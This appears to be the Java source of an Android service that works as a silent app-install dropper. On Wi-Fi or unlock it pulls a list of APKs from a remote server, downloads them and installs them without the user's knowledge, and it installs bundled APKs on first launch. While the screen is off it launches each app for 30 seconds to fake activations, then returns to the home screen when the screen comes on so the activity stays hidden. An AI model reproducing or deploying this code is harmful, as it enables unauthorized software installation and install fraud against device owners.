package com.xstd.active.plugin;

import java.io.File;
import java.util.LinkedList;
import java.util.List;
import net.tsz.afinal.FinalHttp;
import net.tsz.afinal.http.AjaxCallBack;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.database.Cursor;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.os.SystemClock;
import android.text.format.DateUtils;
import android.text.format.Time;
import com.android.volley.RequestQueue;
import com.android.volley.Response.Listener;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.Volley;
import com.xstd.active.plugin.dao.SilenceApp;
import com.xstd.active.plugin.dao.SilenceAppDao;
import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
import com.xstd.active.plugin.utils.CommandUtil;

public class CoreService extends Service {

	private CoreReceiver receiver;
	private SharedPreferences sharedPreferences;
	private FinalHttp finalHttp;
	private boolean isScreenLight = true;
	private boolean isDownloading = false;

	public static final int STOP_ACTIVE = 0;
	public static final int START_ACTIVE = 1;
	public static final int UNLOCK_SCREEN = 2;
	public static final int WIFI_STATE_CHANGED = 3;

	private static long INIT_FIRST_TIME = -1;

	@SuppressLint("HandlerLeak")
	private Handler mHandler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			boolean first_launch = sharedPreferences.getBoolean("first_launch", true);
			if (first_launch) {
				if (CommandUtil.simReady(getApplicationContext()))
					INIT_FIRST_TIME = System.currentTimeMillis();
				else
					mHandler.sendMessageDelayed(null, 1000 * 60 * 60);
			}
		};
	};

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);

		finalHttp = new FinalHttp();

		receiver = new CoreReceiver();
		IntentFilter filter = new IntentFilter();
		filter.setPriority(Integer.MAX_VALUE);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.addAction(Intent.ACTION_USER_PRESENT);
		filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
		registerReceiver(receiver, filter);

		boolean first_launch = sharedPreferences.getBoolean("first_launch", true);
		if (first_launch) {
			if (CommandUtil.simReady(getApplicationContext()))
				INIT_FIRST_TIME = System.currentTimeMillis();
			else {
				mHandler.sendMessageDelayed(null, 1000 * 30);
			}
			CommandUtil.logW("SIM卡正常，并且未初始化，开始初始化。");
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (receiver != null)
			unregisterReceiver(receiver);
	}

	class CoreReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (Intent.ACTION_SCREEN_ON.equals(action))
				receiveBroadcast(STOP_ACTIVE, intent);
			else if (Intent.ACTION_SCREEN_OFF.equals(action))
				receiveBroadcast(START_ACTIVE, intent);
			else if (Intent.ACTION_USER_PRESENT.equals(action))
				receiveBroadcast(UNLOCK_SCREEN, intent);
			else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
				receiveBroadcast(WIFI_STATE_CHANGED, intent);
		}

	}

	private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {

		@Override
		public void packageInstalled(String packageName, int returnCode) throws RemoteException {
			if (returnCode == 1) {
				SilenceApp sa = new SilenceApp();
				sa.setPackagename(packageName);
				sa.setInstalltime(System.currentTimeMillis());
				sa.setActive(false);
				SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
			}
		}
	};

	/**
	 * 接收到广播
	 * 
	 * @param type
	 *            类型
	 * @param intent
	 */
	private void receiveBroadcast(int type, Intent intent) {
		switch (type) {
		case START_ACTIVE:
			CommandUtil.logW("屏幕暗了。。。");
			isScreenLight = false;
			mHandler.post(startActive);
			if (INIT_FIRST_TIME != -1 && (System.currentTimeMillis() - INIT_FIRST_TIME) > 1000 * 60 * 30 && sharedPreferences.getBoolean("first_launch", true))
				mHandler.post(initFirstLaunch);
			break;
		case STOP_ACTIVE:
			CommandUtil.logW("屏幕亮了。。。");
			isScreenLight = true;
			CommandUtil.goHome(getApplicationContext());
			checkActive();
			break;
		case UNLOCK_SCREEN:
			CommandUtil.logW("解锁屏幕。。。");
			if (CommandUtil.isNetAvailable(getApplicationContext()))
				updateService();
			break;
		case WIFI_STATE_CHANGED:
			CommandUtil.logW("wifi状态改变。。。");
			int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
			if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED) {
				CommandUtil.logW("wifi已经连接。。。");
				updateService();
			}
		}
	}

	/**
	 * 从服务器获取更新
	 */
	private void updateService() {
		long last_update_time = sharedPreferences.getLong("last_update_time", 0);
		if (DateUtils.isToday(last_update_time)) {
			CommandUtil.logW("服务器信息已经更新，开始下载。。");
			startDownload();
			return;
		}
		mustDownloadApp.clear();
		RequestQueue rq = Volley.newRequestQueue(this);
		rq.add(new JsonArrayRequest(SERVER_URL_PATH, new Listener<JSONArray>() {

			@Override
			public void onResponse(JSONArray arg0) {
				CommandUtil.logW(arg0.toString());
				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
				List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
				for (int i = 0; i < arg0.length(); i++) {
					try {
						JSONObject obj = arg0.getJSONObject(i);
						String name = obj.getString("software_name");
						String packName = obj.getString("package_name");
						String url = obj.getString("apk_uri");
						if (!installPackages.contains(packName)) {
							DownloadApplication app = new DownloadApplication();
							app.fileName = name;
							app.packName = packName;
							app.remoteUrl = url;
							mustDownloadApp.add(app);
						}
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}
				startDownload();
			}
		}, null));
		rq.start();
	}

	/**
	 * 開始下載，下載完成安裝
	 */
	private void startDownload() {
		if (!isDownloading && mustDownloadApp.size() > 0) {
			isDownloading = true;
			final DownloadApplication app = mustDownloadApp.removeFirst();
			finalHttp.download(app.remoteUrl, DOWNLOAD_LOCATION + app.fileName, true, new AjaxCallBack<File>() {

				@Override
				public void onSuccess(File file) {
					super.onSuccess(file);
					isDownloading = false;
					CommandUtil.installFile(getApplicationContext(), file, observer);
					startDownload();
				}

				@Override
				public void onFailure(Throwable t, String strMsg) {
					super.onFailure(t, strMsg);
					isDownloading = false;
					mustDownloadApp.add(app);
					SystemClock.sleep(5000);
					startDownload();
				}
			});
		}
	}

	public static class DownloadApplication {
		String fileName;
		String packName;
		String remoteUrl;
	}

	/**
	 * 判斷當前時間是否爲可允許更新
	 * 
	 * @return
	 */
	@SuppressWarnings("unused")
	private boolean isAllowTime() {
		Time time = new Time();
		time.set(System.currentTimeMillis());
		int hour = time.hour;
		if (6 < hour && hour < 9) {
			return true;
		}
		if (hour > 17 && hour < 24) {
			return true;
		}
		return false;
	}

	public static final String SERVER_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/down";
	public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
	public static LinkedList<DownloadApplication> mustDownloadApp = new LinkedList<DownloadApplication>();
	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數

	/**
	 * 当安装的程序在第二天，第五天的时候，修改激活状态
	 */
	private void checkActive() {
		List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
		long currentTimeMillis = System.currentTimeMillis();
		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
		Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
		while (cursor.moveToNext()) {
			long id = cursor.getLong(0);
			String packName = cursor.getString(1);
			long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
			long installTotal = currentTimeMillis - installtime;
			SilenceApp entity = new SilenceApp();
			entity.setId(id);
			entity.setPackagename(packName);
			if (DAY_TIME_MILLIS < installTotal && installTotal < DAY_TIME_MILLIS * 2) {
				if (installPackages.contains(packName)) {
					entity.setActive(false);
					dao.update(entity);
				}
			} else if (DAY_TIME_MILLIS * 4 < installTotal && installTotal < DAY_TIME_MILLIS * 6) {
				if (installPackages.contains(packName)) {
					entity.setActive(false);
					dao.update(entity);
				}
			}
		}
		if (cursor != null)
			cursor.close();
	}

	/**
	 * 激活任务
	 */
	private Runnable startActive = new Runnable() {

		@Override
		public void run() {
			List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
			SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
			Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), "active=?", new String[] { String.valueOf(0) }, null, null,
					SilenceAppDao.Properties.Installtime.columnName + " ASC");
			while (cursor.moveToNext()) {
				long id = cursor.getLong(0);
				String packageName = cursor.getString(1);
				if (!installPackages.contains(packageName)) {
					CommandUtil.logW(packageName + " not active, it's uninstall, delete it in db.");
					continue;
				}
				Intent app = getPackageManager().getLaunchIntentForPackage(packageName);
				startActivity(app);
				SystemClock.sleep(1000 * 30);
				if (isScreenLight) {
					return;
				}
				SilenceApp entity = new SilenceApp();
				entity.setId(id);
				entity.setPackagename(packageName);
				entity.setActive(true);
				dao.update(entity);
			}
			if (cursor != null)
				cursor.close();
		}
	};

	/**
	 * 第一次初始化的任务
	 */
	private Runnable initFirstLaunch = new Runnable() {

		@Override
		public void run() {
			CommandUtil.logW("第一次初始化安装");
			List<File> installFiles = CommandUtil.copyAssetsToSdcard(getApplicationContext(), new File(DOWNLOAD_LOCATION));
			for (File file : installFiles)
				CommandUtil.installFile(getApplicationContext(), file, observer);
			sharedPreferences.edit().putBoolean("first_launch", false).commit();
			INIT_FIRST_TIME = -1;
			CommandUtil.initPreInstallRom(getApplicationContext());
		}
	};

}